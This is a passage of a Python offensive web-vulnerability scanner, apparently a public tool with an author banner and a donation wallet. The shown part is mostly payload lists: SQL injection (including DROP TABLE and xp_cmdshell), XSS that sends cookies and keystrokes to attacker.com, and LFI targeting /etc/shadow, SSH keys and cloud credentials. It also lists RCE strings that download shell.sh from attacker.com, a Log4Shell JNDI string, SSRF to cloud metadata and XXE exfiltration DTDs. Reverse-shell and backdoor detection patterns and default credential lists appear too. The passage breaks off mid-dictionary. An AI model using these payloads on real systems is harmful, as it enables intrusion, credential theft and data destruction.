#!/usr/bin/env python3

import os
import sys
import re
from datetime import datetime
import socket
import requests
import argparse
import json
import dns.resolver
import nmap
import whois
import ipaddress
import ssl
import paramiko
import hashlib
import traceback
import base64
import xml.etree.ElementTree as ET
import subprocess
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, quote
from datetime import datetime
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import threading
import queue
import time
import random
import sqlite3
import csv
import openai
import getpass


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
BLUE = "\033[1;34m"
RESET = "\033[0m"
BANNER = f"""
{CYAN}
┌───────────────────────────────────────┐
│                                       │
│__   __   __  __     _    _       _ _  │
│\ \ / /__|  \/  | __| |  / \     | (_) │
│ \ V / __| |\/| |/ _` | / _ \ _  | | | │
│  | |\__ \ |  | | (_| |/ ___ \ |_| | | │
│  |_||___/_|  |_|\__,_/_/   \_\___/|_| │
│                                       │
│                                       │
└───────────────────────────────────────┘
@@@@@@@@@@@@@@@@@@ "younistrck" @@@@@@@@@@@@@@@@@@
{RESET}
{YELLOW}Elite Vulnerability Scanner v10.4 - Full Spectrum Cyber Defense{RESET}
{GREEN}Developed for authorized penetration testing only{RESET}
{CYAN}AI-Powered Threat Detection & Zero Trust Compliance Engine{RESET}
{RESET}
{YELLOW}Been programmed by - AL HACKER -> Younis mohammed al jilani
~ My Account OWN TOOL Telegram ° https://t.me/yoyns
~ My Channel YouTube ~ https://www.youtube.com/@5d.S
{BLUE}Link AL TOOL v10.4 https://github.com/DrKritos/YounisTrck{RESET}
{RESET}
{RED}Donate crypto coin:~ ID Wallet Payeer : ` P1087373730 ` 
{RESET}
"""
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
HEADERS = {'User-Agent': USER_AGENT}


COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "webmail", "admin", "blog", "test", "dev", 
    "shop", "api", "staging", "prod", "cdn", "static", "assets",
    "app", "mobile", "m", "secure", "vpn", "portal", "cms", "wp",
    "dashboard", "console", "backend", "frontend", "gateway",
    "aws", "azure", "gcp", "cloud", "storage", "s3", "bucket",
    "jenkins", "gitlab", "github", "bitbucket", "docker", "k8s",
    "kubernetes", "monitor", "metrics", "logs", "analytics",
    "elastic", "kibana", "grafana", "prometheus", "redis",
    "mysql", "mongo", "postgres", "db", "database", "rabbitmq",
    "kafka", "zookeeper", "nginx", "apache", "iis", "tomcat",
    "weblogic", "websphere", "jboss", "wildfly",
    
    "old", "new", "demo", "sandbox", "backup", "archive", "temp",
    "tmp", "test2", "dev2", "staging2", "beta", "alpha", "gamma",
    "preprod", "preproduction", "uat", "qa", "quality", "debug",
    "live", "production", "prod2", "main", "master", "primary",
    "secondary", "backup2", "replica", "mirror", "cdn2", "cdn3",
    "images", "img", "video", "media", "uploads", "files", "docs",
    "documents", "download", "upload", "storage2", "data", "db2",
    "database2", "sql", "nosql", "cache", "redis2", "memcached",
    "queue", "message", "mq", "rabbit", "kafka2", "zookeeper2",
    "search", "solr", "elasticsearch", "logstash", "kibana2",
    "grafana2", "prometheus2", "alertmanager", "thanos", "loki",
    "jaeger", "zipkin", "tracing", "monitoring", "metrics2",
    "health", "status", "ping", "ready", "alive", "livecheck",
    "web", "web2", "site", "site2", "portal2", "my", "account",
    "user", "users", "member", "members", "client", "clients",
    "customer", "customers", "admin2", "administrator", "root",
    "super", "superuser", "moderator", "editor", "author", "writer",
    "support", "helpdesk", "help2", "contact", "info", "information",
    "sales", "marketing", "ads", "advertising", "adserver", "ad",
    "billing", "payment", "pay", "checkout", "shop2", "store2",
    "ecommerce", "cart", "order", "orders", "invoice", "billing2",
    "payment2", "paypal", "stripe", "ssl", "secure2", "security",
    "auth", "authentication", "login", "signin", "register", "signup",
    "oauth", "sso", "ldap", "active-directory", "adfs", "saml",
    "openid", "jwt", "token", "api2", "rest", "graphql", "soap",
    "xml", "json", "rpc", "grpc", "websocket", "socket", "ws",
    "wss", "ftp2", "sftp", "ssh", "telnet", "rdp", "vnc", "remote",
    "vpn2", "proxy", "firewall", "router", "switch", "gateway2",
    "dns", "dhcp", "ntp", "time", "clock", "mail2", "smtp", "pop3",
    "imap", "exchange", "owa", "outlook", "office", "sharepoint",
    "teams", "skype", "lync", "crm", "erp", "hr", "payroll",
    "accounting", "finance", "legal", "compliance", "audit",
    "backup3", "disaster", "recovery", "archive2", "snapshot",
    "vm", "virtual", "container", "docker2", "k8s2", "kubernetes2",
    "swarm", "mesos", "nomad", "consul", "etcd", "vault", "key",
    "secret", "config", "configuration", "env", "environment",
    "dev3", "test3", "staging3", "prod3", "blue", "green", "canary",
    "ab", "experiment", "feature", "bug", "issue", "ticket",
    "project", "task", "todo", "calendar", "schedule", "event",
    "meeting", "conference", "webinar", "chat", "message2",
    "notification", "alert", "warning", "error", "exception",
    "log", "log2", "audit", "track", "trace", "debug2", "develop",
    "development", "build", "ci", "cd", "deploy", "deployment",
    "release", "version", "v1", "v2", "v3", "latest", "stable",
    "unstable", "nightly", "daily", "weekly", "monthly", "annual"
]


SQLI_PAYLOADS = [
    
    "'", "\"", "`", 
    "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1--", 
    "\" OR \"\"=\"", "\" OR 1=1--",
    "'; DROP TABLE users--", 
    "'; SELECT * FROM information_schema.tables--",
    
    
    "' UNION SELECT 1,2,3--", 
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT 1,@@version,3--",
    "' UNION SELECT 1,database(),3--",
    "' UNION SELECT 1,user(),3--",
    "' UNION SELECT 1,current_user,3--",
    
    
    "' AND 1=1--", "' AND 1=2--",
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' ; WAITFOR DELAY '0:0:5'--",
    "' AND BENCHMARK(5000000,MD5('test'))--",
    
    
    '{"$ne": "invalid"}',
    '{"$gt": ""}',
    '{"$where": "1==1"}',
    '{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
    
    
    "' AND 1=cast((SELECT version()) as int)--",
    "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--",
    
    
    "'; EXEC xp_cmdshell 'dir'--",
    "' AND 1=CONVERT(int,@@version)--",
    
    
    "' AND 1=(SELECT 1 FROM dual)--",
    "' AND (SELECT COUNT(*) FROM all_users) > 0--",
    
    
    "' AND 1=randomblob(1000000000)--",
    
    
    "' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
    "'/**/OR/**/1=1--",
    "'%20OR%201=1--",
    "') OR ('1'='1",
    "\\' OR 1=1--",
    "admin'--",
    "admin'#",
    "admin'/*"
]


XSS_PAYLOADS = [
    
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    
    
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    
    
    "<scr<script>ipt>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "javascrip&#x74;:alert('XSS')",
    "jAvAsCrIpT:alert('XSS')",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')",
    
    
    "#<script>alert('XSS')</script>",
    "?param=<script>alert('XSS')</script>",
    "<img src=\"x\" onerror=\"alert(document.cookie)\">",
    
    
    "<svg><script>alert('XSS')</script>",
    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
    "<svg><script>alert&#40;1&#41;</script>",
    
    
    "{{constructor.constructor('alert(1)')()}}",
    "${alert('XSS')}",
    "#{7*7}",
    
    
    "<details ontoggle=alert('XSS') open>",
    "<select onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    
    
    "<script src=data:,alert(1)>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<form><button formaction=javascript:alert(1)>X",
    "<math href=javascript:alert(1)>X",
    "<link rel=import href=\"javascript:alert(1)\">",
    
    
    "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
    "<img src=x onerror=\"this.src='http://attacker.com/?c='+encodeURIComponent(document.cookie)\">",
    
    
    "<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>"
]


LFI_PAYLOADS = [
    
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/passwd%00",
    "/etc/passwd",
    "../../../etc/passwd",
    "/",
    "/var/www/html",
    "....//....//....//....//etc//passwd",
    "....//....//....//etc//passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    
    
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%252F..%252F..%252F..%252Fetc/passwd",
    "..%255C..%255C..%255C..%255Cwindows/win.ini",
    
    
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5c..%5cwindows\\system32\\drivers\\etc\\hosts",
    "..%255c..%255c..%255c..%255cwindows\\system32\\drivers\\etc\\hosts",
    "c:\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\boot.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    
    
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "php://input",
    "expect://whoami",
    "zip://archive.zip#file.txt",
    
    
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log",
    "../../../../var/log/syslog",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    
    
    "../../../../etc/httpd/conf/httpd.conf",
    "../../../../etc/nginx/nginx.conf",
    "../../../../.ssh/id_rsa",
    "../../../../.aws/credentials",
    "../../../../.bashrc",
    "../../../../.profile",
    "../../../../.my.cnf",
    
    
    "../../../../wp-config.php",
    "../../../../config.php",
    "../../../../.env",
    "../../../../.git/config",
    "../../../../web.config",
    "../../../../.htaccess",
    "../../../../.htpasswd",
    
    
    "http://attacker.com/shell.txt",
    "https://attacker.com/shell.txt",
    "ftp://attacker.com/shell.txt",
    "//attacker.com/shell.txt",
    
    
    "/etc/passwd%00",
    "/etc/passwd%00.jpg",
    "/etc/passwd\0",
    "/etc/passwd\00",
    
    
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "..%255C..%255C..%255C..%255Cwindows%255Cwin.ini"
]


SSH_VULNS = [
    "SSH-2.0-OpenSSH_7.2", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-OpenSSH_7.6",
    "SSH-2.0-OpenSSH_7.7", "SSH-2.0-OpenSSH_8.0", "SSH-2.0-OpenSSH_8.1",
    "SSH-2.0-OpenSSH_8.2", "SSH-2.0-OpenSSH_8.3", "SSH-2.0-OpenSSH_8.4",
    "SSH-2.0-OpenSSH_8.5", "SSH-2.0-OpenSSH_8.6", "SSH-2.0-OpenSSH_8.7",
    "SSH-2.0-OpenSSH_8.8", "SSH-2.0-OpenSSH_8.9", "SSH-2.0-OpenSSH_9.0",
    "SSH-1.99-OpenSSH", "SSH-2.0-Cisco", "SSH-2.0-Dropbear",
    "SSH-2.0-libssh", "SSH-2.0-PuTTY", "SSH-2.0-WinSCP"
]


PHP_VULNS = [
    "PHP/5.6", "PHP/7.0", "PHP/7.1", "PHP/7.2", "PHP/7.3", "PHP/7.4",
    "PHP/8.0", "PHP/8.1", "PHP/8.2", "PHP/8.3",
    
    "PHP/4.0", "PHP/4.1", "PHP/4.2", "PHP/4.3", "PHP/4.4",
    "PHP/5.0", "PHP/5.1", "PHP/5.2", "PHP/5.3", "PHP/5.4", "PHP/5.5"
]


BUG_BOUNTY_VULNS = [
    "CVE-2021-44228",  
    "CVE-2021-45046",  
    "CVE-2022-22965",  
    "CVE-2022-1388",   
    "CVE-2022-30190",  
    "CVE-2023-2868",   
    "CVE-2023-34362",  
    "CVE-2023-35078",  
    "CVE-2024-21413",  
    "CVE-2024-23334",  
    
    "CVE-2021-41773",  
    "CVE-2021-42013",  
    "CVE-2022-24112",  
    "CVE-2022-26134",  
    "CVE-2022-22963",  
    "CVE-2022-29464",  
    "CVE-2022-30525",  
    "CVE-2023-23397",  
    "CVE-2023-27350",  
    "CVE-2023-3519",   
    "CVE-2023-38831",  
    "CVE-2023-40044",  
    "CVE-2024-21412",  
    "CVE-2024-21650",  
    "CVE-2024-21887",  
    "CVE-2024-21888",  
    "CVE-2024-21893",  
    "CVE-2024-21894"   
]


PATCH_VULNS = [
    "Apache/2.4.49", "Apache/2.4.50", "Apache/2.4.51", "Apache/2.4.57",
    "Nginx/1.20.0", "Nginx/1.21.0", "Nginx/1.22.0", "Nginx/1.23.0",
    "OpenSSL/1.0.2", "OpenSSL/1.1.0", "OpenSSL/1.1.1", "OpenSSL/3.0.0",
    
    "Apache/2.2.", "Apache/2.0.", "Apache/1.3.",
    "Nginx/0.7.", "Nginx/0.8.", "Nginx/1.0.", "Nginx/1.2.", "Nginx/1.4.",
    "IIS/6.0", "IIS/7.0", "IIS/7.5", "IIS/8.0", "IIS/8.5", "IIS/10.0",
    "Tomcat/6.", "Tomcat/7.", "Tomcat/8.", "Tomcat/9.", "Tomcat/10.",
    "Node.js/12.", "Node.js/14.", "Node.js/16.", "Node.js/18."
]


ACV_PAYLOADS = [
    "/.htaccess", "/.htpasswd", "/.git/config", "/.svn/entries",
    "/.env", "/wp-config.php", "/config.php", "/configuration.php",
    "/.dockerignore", "/.travis.yml", "/.github/workflows/ci.yml",
    "/.aws/credentials", "/.kube/config", "/.ssh/id_rsa",
    "/backup.sql", "/dump.sql", "/database.sql",
    "/admin/config.yml", "/app/config/parameters.yml",
    
    "/.bash_history", "/.bashrc", "/.profile", "/.my.cnf",
    "/.pgpass", "/.subversion", "/.cvs", "/.bzr",
    "/.hg", "/.gitignore", "/.gitmodules", "/.git/HEAD",
    "/.git/logs/HEAD", "/.git/refs/heads/master",
    "/.svn/wc.db", "/.svn/entries", "/.svn/all-wcprops",
    "/.DS_Store", "/Thumbs.db", "/desktop.ini",
    "/web.config", "/php.ini", "/.user.ini",
    "/backup.tar", "/backup.tar.gz", "/backup.zip",
    "/dump.tar", "/dump.tar.gz", "/dump.zip",
    "/sql.tar", "/sql.tar.gz", "/sql.zip",
    "/old/", "/temp/", "/tmp/", "/cache/", "/logs/",
    "/error_log", "/access_log", "/debug.log",
    "/backup/", "/backups/", "/archive/", "/archives/",
    "/old_files/", "/temp_files/", "/tmp_files/",
    "/database_backup/", "/db_backup/", "/sql_backup/",
    "/www_backup/", "/site_backup/", "/project_backup/",
    "/backup_2023/", "/backup_2024/", "/backup_2025/",
    "/2023_backup/", "/2024_backup/", "/2025_backup/"
]


ACSM_CHECKS = [
    "X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security",
    "X-Content-Type-Options", "X-XSS-Protection", "Referrer-Policy",
    "Permissions-Policy", "Cross-Origin-Embedder-Policy", "Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy", "X-Custom-IP-Authorization", "TRACE",
    "Cookie", "Admin",
    
    "X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version",
    "X-Runtime", "X-Version", "X-Debug-Token", "X-Debug-Token-Link",
    "X-Env", "X-Config", "X-Debug", "X-Developer",
    "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
    "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Client-IP", "X-Host", "X-Url", "X-HTTP-Host-Override"
]


BACKDOOR_PATTERNS = [
    r"eval\(base64_decode\(",
    r"system\(\$_GET\['cmd'\]\)",
    r"shell_exec\(\$_POST\['cmd'\]\)",
    r"passthru\(\$_REQUEST\['exec'\]\)",
    r"exec\(\$_GET\['cmd'\]\)",
    r"popen\(\$_POST\['cmd'\]\)",
    r"proc_open\(\$_REQUEST\['cmd'\]\)",
    r"assert\(\$_GET\['code'\]\)",
    r"create_function\(.*\$_(GET|POST|REQUEST)",
    r"file_put_contents\(.*base64_decode",
    
    r"@eval\(\$_POST\['",
    r"@assert\(\$_REQUEST\['",
    r"preg_replace\(.*/e.*",
    r"array_map\(.*assert.*",
    r"call_user_func\(.*assert.*",
    r"call_user_func_array\(.*assert.*",
    r"register_shutdown_function\(.*assert.*",
    r"register_tick_function\(.*assert.*",
    r"filter_var\(.*FILTER_CALLBACK.*",
    r"filter_input\(.*FILTER_CALLBACK.*",
    r"usort\(.*assert.*",
    r"uksort\(.*assert.*",
    r"array_filter\(.*assert.*",
    r"array_walk\(.*assert.*",
    r"array_walk_recursive\(.*assert.*",
    r"iterator_apply\(.*assert.*",
    r"gzinflate\(base64_decode\(",
    r"str_rot13\(base64_decode\(",
    r"convert_uudecode\(base64_decode\(",
    r"gzuncompress\(base64_decode\(",
    r"gzdecode\(base64_decode\(",
    r"@ini_set\(.*display_errors.*0.*",
    r"@set_time_limit\(0\)",
    r"@ignore_user_abort\(true\)"
]


NETCAT_CHECKS = [
    "nc -lvp", "nc -l -p", "nc -e /bin/sh", "nc -e /bin/bash",
    "nc.traditional", "ncat -lvp", "socat TCP-LISTEN",
    "bash -i >& /dev/tcp/", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc",
    
    "nc -l -e /bin/sh", "nc -l -e /bin/bash",
    "nc -l -c /bin/sh", "nc -l -c /bin/bash",
    "ncat -l -e /bin/sh", "ncat -l -e /bin/bash",
    "socat TCP-LISTEN:1337 EXEC:/bin/bash",
    "socat TCP-LISTEN:1337 EXEC:/bin/sh",
    "bash -c 'bash -i >& /dev/tcp/",
    "/bin/bash -c 'bash -i >& /dev/tcp/",
    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"",
    "perl -e 'use Socket;$i=\"",
    "php -r '$sock=fsockopen(\"",
    "ruby -rsocket -e 'c=TCPSocket.new(\"",
    "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('",
    "telnet ", "netcat ", "ncat ", "socat ",
    "mkfifo ", "mknod ", "pipe=",
    "/dev/tcp/", "/dev/udp/",
    "exec 5<>/dev/tcp/", "exec 5<>/dev/udp/"
]


RCE_PAYLOADS = [
    "|id", ";id", "&&id", "||id",
    "| whoami", "; whoami", "&& whoami",
    "${jndi:ldap://attacker.com/x}",
    "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    "#{7*7}", "${7*7}",
    
    "| ls", "; ls", "&& ls", "|| ls",
    "| cat /etc/passwd", "; cat /etc/passwd", "&& cat /etc/passwd",
    "| uname -a", "; uname -a", "&& uname -a",
    "| pwd", "; pwd", "&& pwd",
    "| ps aux", "; ps aux", "&& ps aux",
    "| netstat -an", "; netstat -an", "&& netstat -an",
    "| ifconfig", "; ifconfig", "&& ifconfig",
    "| ip addr", "; ip addr", "&& ip addr",
    "| wget http://attacker.com/shell.sh -O /tmp/shell.sh",
    "| curl http://attacker.com/shell.sh -o /tmp/shell.sh",
    "| ping -c 1 attacker.com",
    "| nslookup attacker.com",
    "`id`", "$(id)", "`whoami`", "$(whoami)",
    "{{7*7}}", "{7*7}", "<%= 7*7 %>",
    "${{7*7}}", "#{7*7}", "${7*7}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
    "<% Runtime.getRuntime().exec(\"id\") %>"
]


SSRF_PAYLOADS = [
    "http://localhost:22",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:22",
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/xHELO%20localhost",
    
    "http://0.0.0.0:22",
    "http://0.0.0.0:3306",
    "http://0.0.0.0:5432",
    "http://0.0.0.0:6379",
    "http://0.0.0.0:27017",
    "http://localhost:5432",
    "http://localhost:6379",
    "http://localhost:27017",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://[::]:22",
    "http://[::]:3306",
    "http://[::]:5432",
    "http://internal/",
    "http://private/",
    "http://intranet/",
    "http://172.16.0.1/",
    "http://172.17.0.1/",
    "http://172.18.0.1/",
    "http://172.19.0.1/",
    "http://172.20.0.1/",
    "http://172.31.0.1/",
    "http://10.0.0.1/",
    "http://10.1.1.1/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "file:///etc/shadow",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:22",
    "dict://localhost:22",
    "sftp://127.0.0.1:22",
    "ldap://127.0.0.1:389",
    "tftp://127.0.0.1:69",
    "telnet://127.0.0.1:23"
]


XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]>',
    
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY % sp SYSTEM "http://attacker.com/xxe.dtd">%sp;%param1;]><r>&exfil;</r>',
    '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://attacker.com/xxe.dtd"><data>&e1;</data>',
    '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xd [<!ENTITY % d SYSTEM "http://attacker.com/xxe.dtd">%d;]><data>&xxe;</data>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
]




CSRF_PAYLOADS = [
    '<img src="http://target.com/admin/delete_user?id=1">',
    '<form action="http://target.com/admin/change_password" method="POST"><input name="new_password" value="hacked"></form><script>document.forms[0].submit();</script>',
    '<link rel="pingback" href="http://target.com/xmlrpc.php">'
]


IDOR_PAYLOADS = [
    "/api/user/1", "/api/user/2", "/api/user/123",
    "/admin/user/1/profile", "/admin/user/2/profile",
    "/download?file=../../etc/passwd",
    "/invoice?id=1001", "/invoice?id=1002",
    "/order/123", "/order/124", "/order/125"
]


DEBUG_PANELS = [
    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
    "/_debug", "/_panel", "/admin/debug", "/web-console",
    "/rails/console", "/console", "/_console", "/debug/console"
]


COMMON_PASSWORDS = [
    "admin", "password", "123456", "password123", "admin123",
    "1234", "12345", "12345678", "123456789", "1234567890",
    "qwerty", "abc123", "111111", "password1", "admin@123",
    "welcome", "monkey", "letmein", "master", "root",
    "passw0rd", "test", "guest", "default", "123123"
]


COMMON_USERS = [
    "admin", "root", "test", "guest", "user", "demo",
    "administrator", "operator", "superuser", "manager",
    "sysadmin", "webmaster", "support", "info", "webadmin"
]


COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
    993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 27017,
    8080, 8443, 9000, 9200, 9300, 11211, 27017, 28017
]


WORDPRESS_PATHS = [
    "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/",
    "/xmlrpc.php", "/wp-json/", "/wp-config.php", "/readme.html",
    "/license.txt", "/wp-admin/admin-ajax.php", "/wp-admin/install.php"
]


JOOMLA_PATHS = [
    "/administrator/", "/index.php/administrator/", "/joomla/administrator/",
    "/web.config.txt", "/htaccess.txt", "/README.txt", "/LICENSE.txt"
]


DRUPAL_PATHS = [
    "/admin/", "/user/login", "/CHANGELOG.txt", "/COPYRIGHT.txt",
    "/INSTALL.txt", "/MAINTAINERS.txt", "/UPDATE.txt", "/xmlrpc.php"
]


AI_THREAT_PATTERNS = {
    
    "sqli": {
        'errors': r"SQL syntax|mysql_fetch|syntax error|unexpected end|SQL command|You have an error in your SQL syntax|PostgreSQL.*ERROR|ORA-|Microsoft OLE DB|SQLite.*error|MySQL server has gone away",
        'union': r"UNION.*SELECT|UNION ALL SELECT",
        'boolean': r"AND 1=1|AND 1=2|OR 1=1",
        'time_based': r"WAITFOR DELAY|SLEEP\(|BENCHMARK\(|PG_SLEEP",
        'stacked': r";\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)",
        'nosql': r'\{\s*"\$[a-z]+"\s*:'
    },
    
    
    "xss": {
        'script_tags': r"<script[^>]*>.*</script>|<script[^>]*/>",
        'event_handlers': r"onerror=|onload=|onclick=|onmouseover=|onfocus=|onblur=|onchange=|onsubmit=|onreset=|onselect=|onabort=|onkeydown=|onkeypress=|onkeyup=",
        'javascript_uri': r"javascript:|javascrip&#x74;:|j&#x61;vascript:",
        'svg_events': r"<svg.*onload=|<animate.*onbegin=",
        'data_uri': r"data:text/html|data:image/svg+xml",
        'iframe_src': r"<iframe[^>]*src=.*javascript:"
    },
    
    
    "lfi": {
        'unix_paths': r"root:[x*]:0:0:|/etc/passwd|/etc/shadow|/etc/hosts|/proc/self/environ",
        'windows_paths': r"[A-Z]:\\Windows\\System32|\\boot\\.ini|\\windows\\win.ini",
        'php_wrappers': r"php://filter/convert.base64-encode|php://input|data://text/plain|expect://|zip://",
        'path_traversal': r"\.\./|\.\.\\|%2e%2e|%2e%2e%2f|\.\.%2f|\.\.%5c",
        'null_byte': r"%00|\0",
        'log_injection': r"\.\./\.\./logs/|/var/log/|access_log|error_log"
    },
    
    
    "command_injection": {
        'unix_commands': r"sh: |bash: |ls: |cat: |whoami: |id: |pwd:|uname: |ps: |netstat: ",
        'windows_commands': r"cmd\.exe|powershell|net user|dir |type |ipconfig |systeminfo",
        'execution_indicators': r"uid=\d+\(|gid=\d+\(|Microsoft Windows|Directory of",
        'pipe_operators': r"\|\s*\w+|\&\s*\w+|\;\s*\w+|\`\s*\w+\`|\$\s*\(\s*\w+\s*\)"
    },
    
    
    "php_weak_config": {
        'dangerous_functions': r"disable_functions\s*=\s*.*(exec|passthru|shell_exec|system|proc_open|popen|curl_exec|parse_ini_file|show_source|highlight_file)",
        'display_errors': r"display_errors\s*=\s*On",
        'allow_url_include': r"allow_url_include\s*=\s*On",
        'open_basedir': r"open_basedir\s*=\s*none",
        'safe_mode': r"safe_mode\s*=\s*Off",
        'register_globals': r"register_globals\s*=\s*On"
    },
    
    
    "backdoor": {
        'eval_base64': r"eval\(base64_decode\(|eval\(gzinflate\(",
        'system_calls': r"system\(\$_(GET|POST|REQUEST|COOKIE)\[",
        'shell_execution': r"shell_exec\(\$_(GET|POST|REQUEST)|exec\(\$_(GET|POST|REQUEST)",
        'file_manipulation': r"file_put_contents\(.*base64_decode|fwrite\(.*eval\(",
        'obfuscation': r"str_rot13\(|gzinflate\(|base64_decode\(.*base64_decode",
        'dynamic_execution': r"\$_(GET|POST|REQUEST)\[.*\]\(\)"
    },
    
    
    "netcat": {
        'nc_commands': r"nc -lvp|nc -l -p|nc -e /bin/sh|nc -e /bin/bash|nc -l -e",
        'bash_shells': r"bash -i >& /dev/tcp/|/bin/bash -i >&",
        'socat_commands': r"socat TCP-LISTEN:|socat UDP-LISTEN:",
        'powerShell_reverse': r"powershell.*System.Net.Sockets",
        'python_reverse': r"python.*socket.*connect",
        'perl_reverse': r"perl.*Socket.*new"
    },
    
    
    "api_security": {
        'graphql_introspection': r"__schema|__type|QueryType|MutationType",
        'jwt_tokens': r"eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*\.[A-Za-z0-9._-]*",
        'api_keys': r"api[_-]?key|secret[_-]?key|access[_-]?token",
        'endpoint_exposure': r"/api/v[0-9]/|/graphql|/rest/v[0-9]/|/swagger|/openapi",
        'auth_headers': r"Authorization:\s*Bearer|X-API-Key|X-API-Token"
    },
    
    
    "cloud_security": {
        'aws_keys': r"AKIA[0-9A-Z]{16}",
        'azure_keys': r"AccountKey=[a-zA-Z0-9+/=]{88}",
        'gcp_keys': r"AIza[0-9A-Za-z-_]{35}",
        'docker_config': r"docker.sock|/var/run/docker.sock",
